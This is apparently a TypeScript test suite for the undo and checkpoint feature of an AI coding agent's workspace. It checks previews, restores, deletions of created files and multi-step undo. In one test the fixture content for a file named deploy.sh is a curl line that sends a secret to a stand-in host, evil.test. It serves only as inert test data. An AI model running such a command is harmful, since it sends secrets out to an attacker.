// Undo.
//
// The store is already tested; what is tested here is the part a user touches — that the
// preview tells the truth about what will happen, that applying it does exactly that, and
// that a second undo walks one step further back instead of repeating the first.
import assert from "node:assert/strict";
import test from "node:test";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { capture, captureWorkspace, storeFor, list } from "./checkpoints.ts";
import { apply, describe, describeResult, preview, previewLatest } from "./undo.ts";

async function withWorkspace(
  body: (dir: string, store: ReturnType<typeof storeFor>) => Promise<void>,
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), "weaver-undo-"));
  const store = storeFor(dir, 10);
  try {
    await body(dir, store);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

test("there is nothing to undo on a fresh workspace", async () => {
  await withWorkspace(async (dir, store) => {
    assert.equal(await previewLatest(store, dir), null);
    assert.equal(await preview(store, dir, "nope"), null);
  });
});

test("an edit is previewed as a restore and applied as one", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "app.ts"), "before\n", "utf8");
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "edit_file", label: "app.ts", paths: ["app.ts"],
    });
    await writeFile(join(dir, "app.ts"), "after\n", "utf8");

    const undo = await previewLatest(store, dir);
    assert.ok(undo !== null);
    assert.equal(undo.id, checkpoint.id);
    assert.deepEqual(undo.restore, ["app.ts"]);
    assert.deepEqual(undo.remove, []);
    assert.equal(undo.untouched, 0);

    // Preview is read-only.
    assert.equal(await readFile(join(dir, "app.ts"), "utf8"), "after\n");

    const result = await apply(store, dir, undo.id);
    assert.ok(result !== null);
    assert.deepEqual(result.restored, ["app.ts"]);
    assert.equal(await readFile(join(dir, "app.ts"), "utf8"), "before\n");
  });
});

test("a created file is previewed as a deletion", async () => {
  await withWorkspace(async (dir, store) => {
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "write_file", label: "deploy.sh", paths: ["deploy.sh"],
    });
    await writeFile(join(dir, "deploy.sh"), "curl https://evil.test?k=SECRET\n", "utf8");

    const undo = await preview(store, dir, checkpoint.id);
    assert.ok(undo !== null);
    assert.deepEqual(undo.remove, ["deploy.sh"]);
    assert.deepEqual(undo.restore, []);
    assert.match(describe(undo).lines.join("\n"), /delete\s+deploy\.sh/);
  });
});

test("a file a shell command created is deleted, because a sweep remembers what was absent", async () => {
  // `touch deploy.sh` is the case a naive checkpoint misses: the file did not exist at
  // capture, so it is not in `files`, and only a set comparison can notice it.
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "keep.ts"), "keep\n", "utf8");
    const checkpoint = await captureWorkspace(store, dir, {
      turn: 1, tool: "run_shell", label: "touch deploy.sh",
    });

    await writeFile(join(dir, "deploy.sh"), "payload\n", "utf8");

    const undo = await preview(store, dir, checkpoint.id);
    assert.ok(undo !== null);
    assert.ok(undo.remove.includes("deploy.sh"), `got remove: ${JSON.stringify(undo.remove)}`);

    await apply(store, dir, checkpoint.id);
    await assert.rejects(readFile(join(dir, "deploy.sh"), "utf8"));
    assert.equal(await readFile(join(dir, "keep.ts"), "utf8"), "keep\n");
  });
});

test("a truncated sweep refuses to guess what was absent", async () => {
  // Rewrite the entry to look truncated: the walk stopped early, so absence proves
  // nothing. Undo may restore what it captured, but must not delete an unknown file.
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.ts"), "a\n", "utf8");
    const checkpoint = await captureWorkspace(store, dir, {
      turn: 1, tool: "run_shell", label: "something",
    });

    const path = join(store.root, "index", `${checkpoint.id}.json`);
    const stored = JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
    stored.complete = false;
    await writeFile(path, JSON.stringify(stored), "utf8");

    await writeFile(join(dir, "surprise.ts"), "not at capture time\n", "utf8");

    const undo = await preview(store, dir, checkpoint.id);
    assert.ok(undo !== null);
    assert.deepEqual(undo.remove, [], "a truncated sweep must not claim a file was created");

    await apply(store, dir, checkpoint.id);
    assert.equal(await readFile(join(dir, "surprise.ts"), "utf8"), "not at capture time\n");
  });
});

test("a precise checkpoint never treats the rest of the workspace as created", async () => {
  // The catastrophic failure this guard exists for: `capture()` names one file, so
  // treating it as a survey would delete every other file in the project on undo.
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "target.ts"), "one\n", "utf8");
    await writeFile(join(dir, "unrelated.ts"), "not mine\n", "utf8");

    await capture(store, dir, { turn: 1, tool: "edit_file", label: "target", paths: ["target.ts"] });
    await writeFile(join(dir, "target.ts"), "two\n", "utf8");

    const undo = await previewLatest(store, dir);
    assert.ok(undo !== null);
    assert.deepEqual(undo.remove, []);
    await apply(store, dir, undo.id);

    assert.equal(await readFile(join(dir, "unrelated.ts"), "utf8"), "not mine\n");
  });
});

test("undo twice walks one step further back rather than repeating itself", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "f.ts"), "v1\n", "utf8");
    await capture(store, dir, { turn: 1, tool: "edit_file", label: "to v2", paths: ["f.ts"] });
    await writeFile(join(dir, "f.ts"), "v2\n", "utf8");

    await capture(store, dir, { turn: 1, tool: "edit_file", label: "to v3", paths: ["f.ts"] });
    await writeFile(join(dir, "f.ts"), "v3\n", "utf8");

    const first = await previewLatest(store, dir);
    assert.ok(first !== null);
    await apply(store, dir, first.id);
    assert.equal(await readFile(join(dir, "f.ts"), "utf8"), "v2\n");

    const second = await previewLatest(store, dir);
    assert.ok(second !== null);
    assert.notEqual(second.id, first.id, "the consumed checkpoint must not come back");
    await apply(store, dir, second.id);
    assert.equal(await readFile(join(dir, "f.ts"), "utf8"), "v1\n");

    assert.equal(await previewLatest(store, dir), null);
    assert.equal((await list(store)).length, 0);
  });
});

test("an older checkpoint admits that newer work exists", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "f.ts"), "a\n", "utf8");
    const older = await capture(store, dir, { turn: 1, tool: "edit_file", label: "a", paths: ["f.ts"] });
    await writeFile(join(dir, "f.ts"), "b\n", "utf8");
    await capture(store, dir, { turn: 1, tool: "edit_file", label: "b", paths: ["f.ts"], now: Date.now() + 1000 });

    const undo = await preview(store, dir, older.id);
    assert.ok(undo !== null);
    assert.equal(undo.newer, 1);
    assert.match(describe(undo).lines.join("\n"), /1 newer checkpoint/);
  });
});

test("a partial undo keeps its record and reports it", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.ts"), "content\n", "utf8");
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "edit_file", label: "a", paths: ["a.ts"],
    });

    // Simulate storage damage: the index survives, the blob does not.
    const hash = checkpoint.files[0]?.hash;
    assert.ok(typeof hash === "string");
    await rm(join(store.root, "blobs", hash.slice(0, 2), hash), { force: true });

    await writeFile(join(dir, "a.ts"), "changed\n", "utf8");
    const result = await apply(store, dir, checkpoint.id);
    assert.ok(result !== null);
    assert.deepEqual(result.missing, ["a.ts"]);

    // Out of the undo chain, but not forgotten.
    assert.equal(await preview(store, dir, checkpoint.id), null);
    assert.equal((await list(store)).length, 0);
    assert.match(describeResult(result).join("\n"), /could not restore 1 file/);
  });
});

test("a clean undo reports what it actually did", async () => {
  await withWorkspace(async (dir, store) => {
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "write_file", label: "new.ts", paths: ["new.ts"],
    });
    await writeFile(join(dir, "new.ts"), "x\n", "utf8");

    const result = await apply(store, dir, checkpoint.id);
    assert.ok(result !== null);
    const text = describeResult(result).join("\n");
    assert.match(text, /deleted 1 file/);
    assert.doesNotMatch(text, /could not restore/);
  });
});
